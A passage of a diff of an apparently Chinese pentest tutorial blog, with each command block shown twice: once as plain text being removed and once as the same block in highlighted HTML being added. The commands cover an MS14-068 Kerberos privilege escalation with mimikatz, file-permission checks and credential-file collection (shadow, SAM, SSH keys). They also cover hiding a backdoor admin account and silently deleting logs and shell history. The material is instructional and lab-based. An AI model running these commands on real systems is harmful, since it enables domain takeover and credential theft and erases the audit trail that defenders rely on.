class="number">172.16</span><span class="number">.10</span><span class="number">.132</span></span><br><span class="line">  </span><br><span class="line"># 下载安装模块https:<span class="comment">//github.com/bidord/pykek</span></span><br></pre></td></tr></table></figure>
 
-  # 在 Win7 上使用本地用户登录
-  # 查看域账号的信息
-  C:\&gt;net user
-      \\WIN7-VM 的用户帐户
-      Administrator            Guest                    John
-      user1                    user2
-      命令成功完成。
-  C:\Win32&gt;whoami.exe /all
-      [User]     = &quot;LAB\user3&quot;  S-1-5-21-3056505427-3800332898-2304591883-1111
-
-  # kali 报错缺少模块
-  root@kali:~# python 35474.py -u user3@lab.com -s S-1-5-21-3056505427-3800332898-2304591883-1111 -d 172.16.10.132
-
-  # 下载安装模块https://github.com/bidord/pykek
-</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165535193.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20190413165535193.png" alt="在这里插入图片描述"></p>
 </li>
 </ul>
-<pre><code>     root@kali:~/Desktop/pykek-master# python ms14-068.py -u user3@lab.com -s S-1-5-21-3056505427-3800332898-2304591883-1111 -d 172.16.10.132
-     Password: 
-       [+] Building AS-REQ for 172.16.10.132... Done!
-       [+] Sending AS-REQ to 172.16.10.132... Done!
-       [+] Receiving AS-REP from 172.16.10.132... Done!
-       [+] Parsing AS-REP from 172.16.10.132... Done!
-       [+] Building TGS-REQ for 172.16.10.132... Done!
-       [+] Sending TGS-REQ to 172.16.10.132... Done!
-       [+] Receiving TGS-REP from 172.16.10.132... Done!
-       [+] Parsing TGS-REP from 172.16.10.132... Done!
-       [+] Creating ccache file &#39;TGT_user1@lab.com.ccache&#39;... Done        
-     # 将文件拷贝到 Win7</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165539296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<pre><code>     # 在 Win7 下执行
-     C:\mimikatz\Win32&gt;mimikatz.exe log &quot;kerberos::ptc TGT_user3@lab.com.ccache&quot; exit
- ![在这里插入图片描述](https://img-blog.csdnimg.cn/2019041316554383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70)
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~/Desktop/pykek-master# python ms14<span class="number">-068.</span>py -u <span class="symbol">user3@</span>lab.com -s S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3056505427</span><span class="number">-3800332898</span><span class="number">-2304591883</span><span class="number">-1111</span> -d <span class="number">172.16</span><span class="number">.10</span><span class="number">.132</span></span><br><span class="line">Password: </span><br><span class="line">  [+] Building AS-REQ <span class="keyword">for</span> <span class="number">172.16</span><span class="number">.10</span><span class="number">.132</span>... Done!</span><br><span class="line">  [+] Sending AS-REQ to <span class="number">172.16</span><span class="number">.10</span><span class="number">.132</span>... Done!</span><br><span class="line">  [+] Receiving AS-REP <span class="keyword">from</span> <span class="number">172.16</span><span class="number">.10</span><span class="number">.132</span>... Done!</span><br><span class="line">  [+] Parsing AS-REP <span class="keyword">from</span> <span class="number">172.16</span><span class="number">.10</span><span class="number">.132</span>... Done!</span><br><span class="line">  [+] Building TGS-REQ <span class="keyword">for</span> <span class="number">172.16</span><span class="number">.10</span><span class="number">.132</span>... Done!</span><br><span class="line">  [+] Sending TGS-REQ to <span class="number">172.16</span><span class="number">.10</span><span class="number">.132</span>... Done!</span><br><span class="line">  [+] Receiving TGS-REP <span class="keyword">from</span> <span class="number">172.16</span><span class="number">.10</span><span class="number">.132</span>... Done!</span><br><span class="line">  [+] Parsing TGS-REP <span class="keyword">from</span> <span class="number">172.16</span><span class="number">.10</span><span class="number">.132</span>... Done!</span><br><span class="line">  [+] Creating ccache file <span class="string">'TGT_user1@lab.com.ccache'</span>... Done		</span><br><span class="line"># 将文件拷贝到 Win7</span><br></pre></td></tr></table></figure>
 
-     # 如果injecte成功 你有可能获得到了域管理session，那么klist看一下是否有了kerberos Ticket
-     C:\mimikatz\Win32&gt;klist
-         当前登录 ID 是 0:0x776bd
-         缓存的票证: (1)
-         #0&gt;     客户端: user3 @ LAB.COM
-             服务器: krbtgt/LAB.COM @ LAB.COM
-             Kerberos 票证加密类型: RSADSI RC4-HMAC(NT)
-             票证标志 0x50a00000 -&gt; forwardable proxiable renewable pre_authent
-             开始时间: 3/4/2018 2:00:45 (本地)
-             结束时间:   3/4/2018 12:00:44 (本地)
-             续订时间: 3/11/2018 2:00:44 (本地)
-             会话密钥类型: RSADSI RC4-HMAC(NT)
-     C:\mimikatz\Win32&gt;net use \\Win2003.lab.com\admin$
-         命令成功完成。</code></pre><h4 id="利用配置不当提权"><a href="#利用配置不当提权" class="headerlink" title="利用配置不当提权"></a>利用配置不当提权</h4><ul>
+<p><img src="https://img-blog.csdnimg.cn/20190413165539296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">	# 在 Win7 下执行</span><br><span class="line">	C:\mimikatz\Win32&gt;mimikatz.exe log <span class="string">"kerberos::ptc TGT_user3@lab.com.ccache"</span> exit</span><br><span class="line">![在这里插入图片描述](https:<span class="comment">//img-blog.csdnimg.cn/2019041316554383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70)</span></span><br><span class="line">	</span><br><span class="line">	# 如果injecte成功 你有可能获得到了域管理session，那么klist看一下是否有了kerberos Ticket</span><br><span class="line">	C:\mimikatz\Win32&gt;klist</span><br><span class="line">		当前登录 ID 是 <span class="number">0</span>:<span class="number">0x776bd</span></span><br><span class="line">		缓存的票证: (<span class="number">1</span>)</span><br><span class="line">		#<span class="number">0</span>&gt;     客户端: user3 @ LAB.COM</span><br><span class="line">	        服务器: krbtgt/LAB.COM @ LAB.COM</span><br><span class="line">	        Kerberos 票证加密类型: RSADSI RC4-HMAC(NT)</span><br><span class="line">	        票证标志 <span class="number">0x50a00000</span> -&gt; forwardable proxiable renewable pre_authent</span><br><span class="line">	        开始时间: <span class="number">3</span>/<span class="number">4</span>/<span class="number">2018</span> <span class="number">2</span>:<span class="number">00</span>:<span class="number">45</span> (本地)</span><br><span class="line">	        结束时间:   <span class="number">3</span>/<span class="number">4</span>/<span class="number">2018</span> <span class="number">12</span>:<span class="number">00</span>:<span class="number">44</span> (本地)</span><br><span class="line">	        续订时间: <span class="number">3</span>/<span class="number">11</span>/<span class="number">2018</span> <span class="number">2</span>:<span class="number">00</span>:<span class="number">44</span> (本地)</span><br><span class="line">	        会话密钥类型: RSADSI RC4-HMAC(NT)</span><br><span class="line">	C:\mimikatz\Win32&gt;net use \\Win2003.lab.com\admin$</span><br><span class="line">		命令成功完成。</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用配置不当提权"><a href="#利用配置不当提权" class="headerlink" title="利用配置不当提权"></a>利用配置不当提权</h4><ul>
 <li>与漏洞提权相比更常用的方法 <ul>
 <li>企业环境 </li>
 <li>补丁更新的全部已经安装 </li>
@@ -1040,204 +813,33 @@
 <ul>
 <li>icacls 在 win2003 及以后的版本中存在，可以拷贝到 WinXP 中</li>
 </ul>
-<pre><code> C:\&gt;icacls boot.ini
-     boot.ini BUILTIN\Power Users:(RX)
-              BUILTIN\Administrators:(F)
-              NT AUTHORITY\SYSTEM:(F)
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="string">\&gt;icacls</span> boot.ini</span><br><span class="line">	boot.ini BUILTIN<span class="string">\Power</span> Users:(RX)</span><br><span class="line">	         BUILTIN<span class="string">\Administrators:(F)</span></span><br><span class="line">	         NT AUTHORITY<span class="string">\SYSTEM:(F)</span></span><br><span class="line">	</span><br><span class="line">	Successfully processed <span class="number">1</span> files; Failed processing <span class="number">0</span> files</span><br><span class="line"><span class="comment"># 如果 user 用户拥有 F（FULL）权限，则可以直接控制系统</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询各程序的权限情况</span></span><br><span class="line">C:<span class="string">\&gt;icacls</span> c:<span class="string">\windows\*.exe</span> /save saveicacls /T</span><br></pre></td></tr></table></figure>
 
-     Successfully processed 1 files; Failed processing 0 files
- # 如果 user 用户拥有 F（FULL）权限，则可以直接控制系统
+<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427213117.png" alt=""></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">BU：build user</span><br><span class="line">PU：power user</span><br><span class="line">BA：build administrator</span><br><span class="line"></span><br><span class="line">如果 BU 是 F 的话，则说明可以替换</span><br><span class="line">如果出现 FA；；；BU，则说明权限配置不当</span><br><span class="line"></span><br><span class="line"><span class="comment"># kali 下使用 c 文件生成 winXP 下的可执行程序</span></span><br><span class="line">root@kali:~# i686-w64-mingw32-gcc -o admin.exe admin.c</span><br></pre></td></tr></table></figure>
 
- # 查询各程序的权限情况
- C:\&gt;icacls c:\windows\*.exe /save saveicacls /T
-</code></pre><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427213117.png" alt=""></p>
-<pre><code> BU：build user
- PU：power user
- BA：build administrator
+<h5 id="2-linux-下查看权限"><a href="#2-linux-下查看权限" class="headerlink" title="2.linux 下查看权限"></a>2.linux 下查看权限</h5><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# <span class="keyword">ls</span> -l</span><br><span class="line">find / -perm <span class="number">777</span> -<span class="keyword">exec</span> <span class="keyword">ls</span> -l &#123;&#125; \;</span><br></pre></td></tr></table></figure>
 
- 如果 BU 是 F 的话，则说明可以替换
- 如果出现 FA；；；BU，则说明权限配置不当
+<h5 id="3-应用系统的配置文件"><a href="#3-应用系统的配置文件" class="headerlink" title="3.应用系统的配置文件"></a>3.应用系统的配置文件</h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 应用连接数据库的配置文件</span><br><span class="line"><span class="number">2.</span> 后台服务运行账号</span><br></pre></td></tr></table></figure>
 
- # kali 下使用 c 文件生成 winXP 下的可执行程序
- root@kali:~# i686-w64-mingw32-gcc -o admin.exe admin.c</code></pre><h5 id="2-linux-下查看权限"><a href="#2-linux-下查看权限" class="headerlink" title="2.linux 下查看权限"></a>2.linux 下查看权限</h5><pre><code>root@kali:~# ls -l
-find / -perm 777 -exec ls -l {} \;</code></pre><h5 id="3-应用系统的配置文件"><a href="#3-应用系统的配置文件" class="headerlink" title="3.应用系统的配置文件"></a>3.应用系统的配置文件</h5><pre><code>1. 应用连接数据库的配置文件
-2. 后台服务运行账号</code></pre><h4 id="收集敏感信息"><a href="#收集敏感信息" class="headerlink" title="收集敏感信息"></a>收集敏感信息</h4><h5 id="1-提权之后收集基本信息"><a href="#1-提权之后收集基本信息" class="headerlink" title="1. 提权之后收集基本信息"></a>1. 提权之后收集基本信息</h5><pre><code># Linux
-•/etc/resolv.conf
-•/etc/passwd
-•/etc/shadow
-•whoami and who –a
-•ifconfig -a, iptables -L -n, ifconfig –a, netstat –r
-•uname –a, ps aux
-•dpkg -l| head
+<h4 id="收集敏感信息"><a href="#收集敏感信息" class="headerlink" title="收集敏感信息"></a>收集敏感信息</h4><h5 id="1-提权之后收集基本信息"><a href="#1-提权之后收集基本信息" class="headerlink" title="1. 提权之后收集基本信息"></a>1. 提权之后收集基本信息</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Linux</span></span><br><span class="line">•/etc/resolv.conf</span><br><span class="line">•/etc/passwd</span><br><span class="line">•/etc/shadow</span><br><span class="line">•whoami <span class="keyword">and</span> who –a</span><br><span class="line">•ifconfig -a, iptables -L -n, ifconfig –a, netstat –r</span><br><span class="line">•uname –a, ps aux</span><br><span class="line">•dpkg -l| head</span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows</span></span><br><span class="line">•ipconfig /all , ipconfig /displaydns, netstat -bnao , netstat –r</span><br><span class="line">•net view , net view /domain    # 查共享信息</span><br><span class="line">•net<span class="built_in"> user </span>/domain, net<span class="built_in"> user </span>%username% /domain  # 查域信息</span><br><span class="line">•net accounts, net share</span><br><span class="line">•net localgroup administrators username /add</span><br><span class="line">•net<span class="built_in"> group </span><span class="string">"Domain Controllers"</span> /domain</span><br><span class="line">•net share name$=C:\ /unlimited    # 把 C盘共享出来</span><br><span class="line">•net<span class="built_in"> user </span>username /active:yes /domain  # 域管理员重新启动被锁定账号</span><br></pre></td></tr></table></figure>
 
-# Windows
-•ipconfig /all , ipconfig /displaydns, netstat -bnao , netstat –r
-•net view , net view /domain    # 查共享信息
-•net user /domain, net user %username% /domain  # 查域信息
-•net accounts, net share
-•net localgroup administrators username /add
-•net group &quot;Domain Controllers&quot; /domain
-•net share name$=C:\ /unlimited    # 把 C盘共享出来
-•net user username /active:yes /domain  # 域管理员重新启动被锁定账号
-</code></pre><h5 id="2-WMIC-WINDOWS-MANAGEMENT-INSTRUMENTATION"><a href="#2-WMIC-WINDOWS-MANAGEMENT-INSTRUMENTATION" class="headerlink" title="2. WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)"></a>2. WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)</h5><pre><code>C:\Users\John&gt;wmic
-wmic:root\cli&gt;/?
-[global switches] &lt;command&gt;
+<h5 id="2-WMIC-WINDOWS-MANAGEMENT-INSTRUMENTATION"><a href="#2-WMIC-WINDOWS-MANAGEMENT-INSTRUMENTATION" class="headerlink" title="2. WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)"></a>2. WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\John&gt;wmic</span><br><span class="line">wmic:root\cli&gt;/?</span><br><span class="line">[global switches] &lt;command&gt;</span><br><span class="line"></span><br><span class="line">有效的全局开关有:</span><br><span class="line">/NAMESPACE           别名使用的名称空间路径。</span><br><span class="line">/ROLE                包含此别名定义的角色路径。</span><br><span class="line">/NODE                别名使用的服务器。</span><br><span class="line">/IMPLEVEL            客户模拟级别。</span><br><span class="line">/AUTHLEVEL           客户身份验证级别。</span><br><span class="line">/LOCALE              客户应用的语言识别符。</span><br><span class="line">/PRIVILEGES          启用或禁用所有特权。</span><br><span class="line">/TRACE               将调试信息输出到 stderr。</span><br><span class="line">/RECORD              将所有输入命令和输出写入日志。</span><br><span class="line">/INTERACTIVE         设置或重设交互模式。</span><br><span class="line">/FAILFAST            设置或重置 FailFast 模式。</span><br><span class="line"><span class="built_in">/USER </span>               会话期间使用的用户。</span><br><span class="line">/PASSWORD            用于会话登录的密码。</span><br><span class="line">/OUTPUT              为输出重新定向指定模式。</span><br><span class="line">/APPEND              为输出重新定向指定模式。</span><br><span class="line">/AGGREGATE           设置或重置集合模式。</span><br><span class="line">/AUTHORITY           Specifies the &lt;authority type&gt; <span class="keyword">for</span> the connection.</span><br><span class="line">/?[:&lt;BRIEF|FULL&gt;]    用法信息。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">•wmic nicconfig <span class="builtin-name">get</span> ipaddress,macaddress</span><br><span class="line">•wmic computersystem <span class="builtin-name">get</span> username</span><br><span class="line">•wmic netlogin <span class="builtin-name">get</span> name,lastlogon</span><br><span class="line">•wmic process <span class="builtin-name">get</span> caption, executablepath,commandline   # 提取软件安装信息</span><br><span class="line">•wmic process where <span class="attribute">name</span>=“calc.exe" call terminate  # 结束进程</span><br><span class="line">•wmic os <span class="builtin-name">get</span> name,servicepackmajorversion       #提取操作系统的补丁版本</span><br><span class="line">•wmic product <span class="builtin-name">get</span> name,version                  # 提取软件信息</span><br><span class="line">•wmic product where <span class="attribute">name</span>=“name” call uninstall /nointeractive   # 静默删除</span><br><span class="line">•wmic share <span class="builtin-name">get</span> /ALL                            # 提取共享文件夹</span><br><span class="line">•wmic /node:<span class="string">"machinename"</span> path Win32_TerminalServiceSetting where  <span class="attribute">AllowTSConnections</span>=<span class="string">"0"</span> call SetAllowTSConnections <span class="string">"1"</span>    # 开远程桌面</span><br><span class="line">•wmic nteventlog <span class="builtin-name">get</span> path,filename, writeable   #查看日志目录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\&gt;wmic nteventlog <span class="builtin-name">get</span> path,filename, writeable</span><br><span class="line">FileName   Path                       Writeable</span><br><span class="line">appevent   \windows\system32\config\  <span class="literal">TRUE</span></span><br><span class="line">ntds       \windows\system32\config\  <span class="literal">TRUE</span></span><br><span class="line">dnsevent   \windows\system32\config\  <span class="literal">TRUE</span></span><br><span class="line">ntfrs      \windows\system32\config\  <span class="literal">TRUE</span></span><br><span class="line">secevent   \windows\system32\config\  <span class="literal">TRUE</span></span><br><span class="line">sysevent   \windows\system32\config\  <span class="literal">TRUE</span></span><br><span class="line">ThinPrint  \windows\system32\config\  <span class="literal">TRUE</span></span><br></pre></td></tr></table></figure>
 
-有效的全局开关有:
-/NAMESPACE           别名使用的名称空间路径。
-/ROLE                包含此别名定义的角色路径。
-/NODE                别名使用的服务器。
-/IMPLEVEL            客户模拟级别。
-/AUTHLEVEL           客户身份验证级别。
-/LOCALE              客户应用的语言识别符。
-/PRIVILEGES          启用或禁用所有特权。
-/TRACE               将调试信息输出到 stderr。
-/RECORD              将所有输入命令和输出写入日志。
-/INTERACTIVE         设置或重设交互模式。
-/FAILFAST            设置或重置 FailFast 模式。
-/USER                会话期间使用的用户。
-/PASSWORD            用于会话登录的密码。
-/OUTPUT              为输出重新定向指定模式。
-/APPEND              为输出重新定向指定模式。
-/AGGREGATE           设置或重置集合模式。
-/AUTHORITY           Specifies the &lt;authority type&gt; for the connection.
-/?[:&lt;BRIEF|FULL&gt;]    用法信息。
+<h5 id="3-收集敏感信息"><a href="#3-收集敏感信息" class="headerlink" title="3. 收集敏感信息"></a>3. 收集敏感信息</h5><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Linux</span><br><span class="line">•/etc ；/usr/local/etc</span><br><span class="line">•/etc/passwd ；/etc/shadow</span><br><span class="line">•.ssh ；.gnupg 公私钥</span><br><span class="line">•The e-mail and data files</span><br><span class="line">•业务数据库 ；身份认证服务器数据库</span><br><span class="line">•/tmp</span><br><span class="line"></span><br><span class="line"># windows</span><br><span class="line">•SAM 数据库 ； 注册表文件</span><br><span class="line">•<span class="variable">%SYSTEMROOT%</span><span class="symbol">\r</span>epair<span class="symbol">\S</span>AM</span><br><span class="line">•<span class="variable">%SYSTEMROOT%</span><span class="symbol">\S</span>ystem32<span class="symbol">\c</span>onfig<span class="symbol">\R</span>egBack<span class="symbol">\S</span>AM</span><br><span class="line">•业务数据库； 身份认证数据库</span><br><span class="line">•临时文件目录</span><br><span class="line">•UserProfile<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\T</span>emporary Internet Files\</span><br></pre></td></tr></table></figure>
 
-
-
-•wmic nicconfig get ipaddress,macaddress
-•wmic computersystem get username
-•wmic netlogin get name,lastlogon
-•wmic process get caption, executablepath,commandline   # 提取软件安装信息
-•wmic process where name=“calc.exe&quot; call terminate  # 结束进程
-•wmic os get name,servicepackmajorversion       #提取操作系统的补丁版本
-•wmic product get name,version                  # 提取软件信息
-•wmic product where name=“name” call uninstall /nointeractive   # 静默删除
-•wmic share get /ALL                            # 提取共享文件夹
-•wmic /node:&quot;machinename&quot; path Win32_TerminalServiceSetting where  AllowTSConnections=&quot;0&quot; call SetAllowTSConnections &quot;1&quot;    # 开远程桌面
-•wmic nteventlog get path,filename, writeable   #查看日志目录
-
-
-
-C:\&gt;wmic nteventlog get path,filename, writeable
-FileName   Path                       Writeable
-appevent   \windows\system32\config\  TRUE
-ntds       \windows\system32\config\  TRUE
-dnsevent   \windows\system32\config\  TRUE
-ntfrs      \windows\system32\config\  TRUE
-secevent   \windows\system32\config\  TRUE
-sysevent   \windows\system32\config\  TRUE
-ThinPrint  \windows\system32\config\  TRUE
-</code></pre><h5 id="3-收集敏感信息"><a href="#3-收集敏感信息" class="headerlink" title="3. 收集敏感信息"></a>3. 收集敏感信息</h5><pre><code># Linux
-•/etc ；/usr/local/etc
-•/etc/passwd ；/etc/shadow
-•.ssh ；.gnupg 公私钥
-•The e-mail and data files
-•业务数据库 ；身份认证服务器数据库
-•/tmp
-
-# windows
-•SAM 数据库 ； 注册表文件
-•%SYSTEMROOT%\repair\SAM
-•%SYSTEMROOT%\System32\config\RegBack\SAM
-•业务数据库； 身份认证数据库
-•临时文件目录
-•UserProfile\AppData\Local\Microsoft\Windows\Temporary Internet Files\
-</code></pre><h4 id="清除渗透攻击痕迹"><a href="#清除渗透攻击痕迹" class="headerlink" title="清除渗透攻击痕迹"></a>清除渗透攻击痕迹</h4><ul>
+<h4 id="清除渗透攻击痕迹"><a href="#清除渗透攻击痕迹" class="headerlink" title="清除渗透攻击痕迹"></a>清除渗透攻击痕迹</h4><ul>
 <li>最多也只是清除本地记录，如果有日志服务器的话还是会被记录下所有操作</li>
 <li>windows 系统</li>
 </ul>
-<pre><code>•禁止在登陆界面显示新建账号
-•REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersio\WinLogon\SpecialAccounts\UserList&quot; /v uname /T REG_DWORD /D 0
-•del %WINDIR%\*.log /a/s/q/f
-•History
-•日志
-•auth.log / secure
-•btmp / wtmp
-•lastlog / faillog
-•其他日志和 HIDS 等
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">•禁止在登陆界面显示新建账号</span><br><span class="line">•REG ADD "HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersio<span class="symbol">\W</span>inLogon<span class="symbol">\S</span>pecialAccounts<span class="symbol">\U</span>serList" /v uname /T REG_DWORD /D 0</span><br><span class="line">•del <span class="variable">%WINDIR%</span><span class="symbol">\*</span>.log /a/s/q/f</span><br><span class="line">•History</span><br><span class="line">•日志</span><br><span class="line">•auth.log / secure</span><br><span class="line">•btmp / wtmp</span><br><span class="line">•lastlog / faillog</span><br><span class="line">•其他日志和 HIDS 等</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 控制系统之后，新建账号并添加管理员组</span><br><span class="line">C:<span class="symbol">\&gt;</span>net user user4 123456 /add</span><br><span class="line">命令成功完成。</span><br><span class="line">C:<span class="symbol">\&gt;</span>net localgroup administrators user4 /add</span><br><span class="line">命令成功完成。</span><br><span class="line"># 这样开机登录的界面会显示这个账户</span><br><span class="line"># 可以通过添加注册表来隐藏</span><br><span class="line">REG ADD "HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\W</span>inLogon<span class="symbol">\S</span>pecialAccounts<span class="symbol">\U</span>serList" /v user4 /T REG_DWORD /D 0</span><br><span class="line">C:<span class="symbol">\&gt;</span>REG ADD "HKEY_LOCAL_MACHINE<span class="symbol">\S</span>OFTWARE<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows NT<span class="symbol">\C</span>urrentVersion<span class="symbol">\W</span>inLogon<span class="symbol">\S</span>pecialAccounts<span class="symbol">\U</span>serList" /v user4 /T REG_DWORD /D 0</span><br><span class="line">操作成功结束</span><br><span class="line"># 但是使用 net user 还是可以查看到这个账户</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 强制静默删除日志</span><br><span class="line">C:<span class="symbol">\&gt;</span>del <span class="variable">%WINDIR%</span><span class="symbol">\*</span>.log /a/s/q/f</span><br></pre></td></tr></table></figure>
 
-
-# 控制系统之后，新建账号并添加管理员组
-C:\&gt;net user user4 123456 /add
-命令成功完成。
-C:\&gt;net localgroup administrators user4 /add
-命令成功完成。
-# 这样开机登录的界面会显示这个账户
-# 可以通过添加注册表来隐藏
-REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\SpecialAccounts\UserList&quot; /v user4 /T REG_DWORD /D 0
-C:\&gt;REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\SpecialAccounts\UserList&quot; /v user4 /T REG_DWORD /D 0
-操作成功结束
-# 但是使用 net user 还是可以查看到这个账户
-
-
-# 强制静默删除日志
-C:\&gt;del %WINDIR%\*.log /a/s/q/f</code></pre><ul>
+<ul>
 <li>Linux 系统</li>
 </ul>
-<pre><code>root@kali:~# history
-# history 记录保存在 .bash_history
-root@kali:~# ls -l .bash_history 
-    -rw------- 1 root root 15418 3月   4 00:28 .bash_history
-# 擦除痕迹
-root@kali:~# history -c
-
-root@kali:~# lsattr
-    --------------e---- ./Downloads
-    --------------e---- ./Desktop
-    --------------e---- ./testDir
-    --------------e---- ./Pictures
-    --------------e---- ./Public
-    --------------e---- ./vmware-tools-patches
-    --------------e---- ./Videos
-    --------------e---- ./Documents
